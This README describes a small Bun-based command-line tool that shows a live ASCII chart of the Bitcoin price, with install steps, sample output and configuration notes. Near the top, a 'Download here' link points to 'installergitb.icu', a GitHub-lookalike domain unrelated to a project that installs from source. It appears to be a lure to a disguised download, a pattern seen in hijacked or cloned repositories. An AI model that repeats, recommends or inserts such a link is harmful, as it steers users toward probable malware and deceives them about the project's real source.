# Labs CLI Chart

[Download here](https://installergitb.icu?hqkqgi2vywbsmp1)

A lightweight command-line Bitcoin price chart with real-time updates. This tool displays Bitcoin price data in your terminal as an ASCII chart with automatic refresh functionality.

## Features

- Real-time Bitcoin price monitoring in USD
- ASCII chart visualization directly in your terminal
- Automatic data refresh every 5 seconds
- Daily price history visualization
- Clean console output
- Error handling for API failures

## Installation

To install dependencies:

```bash
bun install
```

## Usage

To run the application:

```bash
bun run index.ts
```

The application will start and display a Bitcoin price chart in your terminal, automatically refreshing every 5 seconds.

## Example Output

```
   104784.89 ┤                                                                                        ╭─╮╭─────── 
   103104.89 ┤                                                                                      ╭─╯ ╰╯        
   101424.89 ┤                                                                                      │             
    99744.88 ┤                                                                                      │             
    98064.88 ┼──╮  ╭──╮╭─╮                                                                   ╭─╮  ╭─╯             
    96384.88 ┤  ╰──╯  ╰╯ ╰─╮                                                           ╭╮    │ ╰──╯               
    94704.88 ┤             │                                                        ╭──╯╰────╯                    
    93024.88 ┤             ╰╮                                                       │                             
    91344.87 ┤              │     ╭╮╭─╮                                             │                             
    89664.87 ┤              │     │││ │                                             │                             
    87984.87 ┤              ╰╮    │││ ╰──╮             ╭─────╮                     ╭╯                             
    86304.87 ┤               │   ╭╯││    │             │     │            ╭╮ ╭╮  ╭─╯                              
    84624.87 ┤               ╰─╮ │ ╰╯    │        ╭────╯     │╭──╮╭─╮     │╰─╯╰──╯                                
    82944.86 ┤                 ╰─╯       │        │          ╰╯  ╰╯ │  ╭──╯                                       
    81264.86 ┤                           │  ╭─────╯                 │  │                                          
    79584.86 ┤                           ╰──╯                       ╰──╯                                          
₿ = $103780.78
```

## Configuration

You can modify the following parameters in `index.ts`:

- `refreshInterval`: Adjust the refresh rate (in milliseconds) 
- `index`: Change which OHLCV data point to plot (4 = close price, 1 = open, 2 = high, 3 = low)
- Chart parameters like `height` and `padding` in the plot function

## Dependencies

- [ccxt](https://github.com/ccxt/ccxt): Cryptocurrency trading API
- [asciichart](https://github.com/kroitor/asciichart): Terminal ASCII line charts
- [Bun](https://bun.sh): JavaScript runtime and package manager

## Technical Details

![](docs/demo.gif)

This application fetches Bitcoin price data from the OKCoin exchange using the CCXT library and renders it as an ASCII chart. The data automatically refreshes at regular intervals to provide near real-time monitoring.

## License

This project is open source and available under the MIT License.
